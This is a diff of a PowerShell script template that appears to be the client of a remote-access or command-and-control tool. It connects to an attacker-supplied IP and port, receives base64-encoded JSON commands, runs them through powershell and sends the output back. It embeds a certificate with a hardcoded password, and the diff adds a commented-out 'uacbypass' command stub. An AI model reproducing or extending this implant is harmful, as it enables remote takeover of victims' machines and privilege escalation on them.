@@ -4,7 +4,6 @@ $Base64Cert = 'MIIJeQIBAzCCCT8GCSqGSIb3DQEHAaCCCTAEggksMIIJKDCCA98GCSqGSIb3DQEHB
 $CertPassword = 'password'
 $isbind = $%s
 
-
 Function Exec-Process ($execPath, $execArgs) {
 	if ($execPath -eq 'powershell') {
 		$execPath = (Get-Command powershell.exe).Definition
@@ -78,34 +77,25 @@ Function Connect-Server ($ip, $port) {
   }
 }
 
-#// Detect if client disconnected
-#if( tcp.Client.Poll( 0, SelectMode.SelectRead ) )
-#{
-#  byte[] buff = new byte[1];
-#  if( tcp.Client.Receive( buff, SocketFlags.Peek ) == 0 )
-#  {
-#    // Client disconnected
-#    bClosed = true;
-#  }
-#}
-
 
 $Client = Connect-Server -ip '%s' -port '%s'
 
 if ($Client.Connected) {
-	while($True) {
+	while ($True) {
+
 		$error.clear()
 		$serverData = $Client.Client.Read($byteAmount, 0, $byteAmount.Length)
 		$asciiData = (New-Object -TypeName System.Text.ASCIIEncoding).GetString($byteAmount, 0, $serverData)
-		$type = ($asciiData | ConvertFrom-Json).type
-		$b64Data = ($asciiData | ConvertFrom-Json).data
 		try {
-			$data = [System.Text.Encoding]::Unicode.GetString([System.Convert]::FromBase64String($b64Data))
+      $type = ($asciiData | ConvertFrom-Json).type
+      $b64Data = ($asciiData | ConvertFrom-Json).data
+      $sendoutput = ($asciiData | ConvertFrom-Json).sendoutput
+      $multiple = ($asciiData | ConvertFrom-Json).multiple
+      $data = [System.Text.Encoding]::Unicode.GetString([System.Convert]::FromBase64String($b64Data))
+      $extra = ($asciiData | ConvertFrom-Json).extra
 		} catch {
 			continue
 		}
-		$sendoutput = ($asciiData | ConvertFrom-Json).sendoutput
-		$multiple = ($asciiData | ConvertFrom-Json).multiple
 
 		if ($serverData -lt 1) {
 			exit
@@ -116,7 +106,15 @@ if ($Client.Connected) {
 			if ($error[0]) {
 				$sendtoServer = ($error[0] | Out-String)
 			}
+      if ($sendtoServer.Length -lt 1) {
+        $sendtoServer = "`0"
+      }
 		}
+
+    #if ($type -eq 'uacbypass') {
+
+
+		#}
 
 		if ($type -eq 'script') {
 			$process = Exec-Process -execPath 'powershell' -execArgs ('-c ' + $data)
